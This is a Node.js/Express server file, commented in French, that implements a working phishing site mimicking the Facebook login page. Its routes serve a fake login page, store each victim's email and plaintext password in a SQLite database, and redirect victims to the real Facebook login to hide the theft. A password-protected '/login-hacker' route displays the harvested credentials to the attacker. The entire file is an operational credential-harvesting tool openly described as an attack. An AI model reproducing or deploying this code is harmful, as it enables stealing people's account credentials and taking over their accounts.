const express = require('express');
const bodyP = require('body-parser');
const cookieP = require('cookie-parser');

// init sqlite db
var fs = require('fs');
var dbFile = './.data/sqlite.db';
var exists = fs.existsSync(dbFile);
var sqlite3 = require('sqlite3').verbose();
var db = new sqlite3.Database(dbFile);
   
const app = express();
app.use(bodyP.urlencoded({ extended: false }))
app.use(cookieP());

var knex = require('knex')({
    client: 'sqlite3',
    connection: {
        filename: ".data/db.sqlite3"
    },
    debug: true,
});

var session = require('express-session');

app.use(session({
    secret: process.env.SECRET,
    resave: false,
    saveUninitialized: false,
}));

const consolidate = require('consolidate');
app.engine('html', consolidate.nunjucks);
app.set('view engine', 'nunjucks');

app.use(express.static('public'));

// Fonction qui recupere les donnees recoltees
async function printTableContent(){
  try{
    let rows = await knex('users');
    let tab = []; 
    let i=0;
    for (var r of rows) {
      tab[i]=r.mail; i++;
      tab[i]=r.pwd; i++;
    }
    return tab;
  }
  catch(err){
     console.error('Erreur dans l\'affichage des éléments de la table');  
  }
}

// Fonction qui renvoie un tableau avec le nom de l'hote et son adversaire
async function testeUserExiste(mail){
  try{ 
    let rows1 = await knex.raw("SELECT users.mail FROM users WHERE users.mail= ? ", [mail]);
    if (rows1.length === 1) {                  
      return true;
    } 
    return false;
  }
  catch(err){
    console.error('Erreur dans la fonction testeUserExiste');  
    console.error(err);
  }
}

// insertion des valeurs de la nouvelle victime
async function insertTableValue(mail, pwd){
  try{
    await knex('users')
              .insert(
                  [{'mail':mail, 'pwd':pwd}]
              );
  }
  catch(err){
    console.error('Erreur dans l\'insertion d\' élément de la table');  
  }
}

// page principale correspondant à la fausse page facebook
app.get('/', function(request, response) {
  response.sendFile(__dirname + '/views/connexion.html');
});

// page principale correspondant à la fausse page facebook
app.get('/connexion', function(request, response) {
  response.sendFile(__dirname + '/views/connexion.html');
});

// page de connexion de l'attaquant pour acceder aux mails et passwords de ses victimes
app.get('/users', function(request, response) {
  response.sendFile(__dirname + '/views/login.html');
});

// Requete POST qui va enregistrer les donnees de la victime dans la base de donnees de l'attaquant et le redirige vers la vraie page de connexion facebook 
app.post('/login', async function(request, response) {
  if(await testeUserExiste(request.body.email)===false){
     // insertion des coordonnees de la victime
    console.warn("Nouvel utilisateur "+request.body.email+" "+request.body.pass);
    await insertTableValue(request.body.email, request.body.pass);
  }
  response.redirect('https://www.facebook.com/login/?next=https%3A%2F%2Fwww.facebook.com%2FGoTMemes%2Fphotos%2Fa.299630363448361%2F2260416757369702');    
});

// Requete POST qui va permettre de s'identifier afin que seul l'attaquant puisse voir les données de ses victimes
app.post('/login-hacker', async function(request, response) {
  if((request.body.login===process.env.LOGIN)&&(request.body.password===process.env.PWD)){
    let liste = await printTableContent(); 
    response.render('users.html', { 'list' : liste});
  }
  else response.sendFile(__dirname + '/views/login.html');
});

app.listen(process.env.PORT);